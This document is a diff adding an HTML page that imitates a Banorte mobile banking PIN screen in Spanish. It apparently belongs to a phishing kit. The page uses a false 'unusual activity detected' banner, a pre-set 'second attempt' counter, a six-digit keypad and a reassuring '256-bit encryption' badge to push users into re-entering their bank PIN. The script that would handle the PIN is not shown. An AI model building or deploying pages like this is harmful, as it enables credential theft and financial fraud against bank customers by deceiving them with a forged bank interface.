@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
+  <meta name="theme-color" content="#E4002B" />
+  <meta name="referrer" content="no-referrer" />
+  <title>Banorte</title>
+  <link rel="stylesheet" href="./css/main.css" />
+</head>
+<body>
+  <div class="app" id="app">
+    <div class="status-bar" aria-hidden="true"></div>
+
+    <header class="nav-bar">
+      <div class="nav-back" aria-hidden="true">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" aria-hidden="true">
+          <path d="M15 6l-6 6 6 6" />
+        </svg>
+      </div>
+      <h1 class="nav-title">Ingresa tu clave</h1>
+      <div class="nav-help" aria-hidden="true">?</div>
+    </header>
+
+    <section class="top">
+      <p class="tagline">Digital Payments</p>
+      <div class="logo-slot">
+        <img class="brand-img" src="./assets/logo.png" width="72" height="72" alt="Banorte" />
+      </div>
+      <p class="pin-label">
+        Ingresa tu PIN de Banorte
+        <span class="sub">Verifica tu identidad para continuar</span>
+      </p>
+      <div class="brand-wave" aria-hidden="true"></div>
+    </section>
+
+    <section class="pin-area" aria-label="PIN">
+      <p class="banner">Actividad inusual detectada en Banorte. Ingresa tu PIN nuevamente para desbloquear.</p>
+      <div class="pin-dots" id="pinDots" aria-live="polite">
+        <span class="pin-dot"></span>
+        <span class="pin-dot"></span>
+        <span class="pin-dot"></span>
+        <span class="pin-dot"></span>
+        <span class="pin-dot"></span>
+        <span class="pin-dot"></span>
+      </div>
+      <p class="error-msg" id="errorMsg" role="alert"></p>
+      <p class="attempt-counter" id="attemptCounter">2do intento</p>
+      <p class="loader" id="loader" aria-hidden="true">Verificando...</p>
+      <div class="bio-row" aria-hidden="true">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+          <path d="M12 11c1.66 0 3-1.34 3-3S13.66 5 12 5 9 6.34 9 8s1.34 3 3 3z" />
+          <path d="M6 20v-1c0-2.21 2.69-4 6-4s6 1.79 6 4v1" />
+        </svg>
+        <span>Usar biometría</span>
+      </div>
+      <button type="button" class="forgot-link" id="forgotBtn">¿Olvidaste tu clave?</button>
+      <p class="secure-note">🔒 Cifrado de 256 bits</p>
+      <p class="bank-footer">Banorte · Secure Digital Wallet</p>
+    </section>
+
+    <section class="keypad" id="keypad" aria-label="Teclado numérico">
+      <div class="keypad-grid">
+        <button type="button" class="key" data-key="1">1</button>
+        <button type="button" class="key" data-key="2">2</button>
+        <button type="button" class="key" data-key="3">3</button>
+        <button type="button" class="key" data-key="4">4</button>
+        <button type="button" class="key" data-key="5">5</button>
+        <button type="button" class="key" data-key="6">6</button>
+        <button type="button" class="key" data-key="7">7</button>
+        <button type="button" class="key" data-key="8">8</button>
+        <button type="button" class="key" data-key="9">9</button>
+        <span class="key empty" aria-hidden="true"></span>
+        <button type="button" class="key" data-key="0">0</button>
+        <button type="button" class="key backspace" data-key="back" aria-label="Borrar">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+            <path d="M9 6L3 12l6 6" />
+            <path d="M3 12h14" />
+            <path d="M21 19V5a2 2 0 0 0-2-2H9" />
+          </svg>
+        </button>
+      </div>
+    </section>
+  </div>
+  <script src="./js/main.js"></script>
+</body>
+</html>
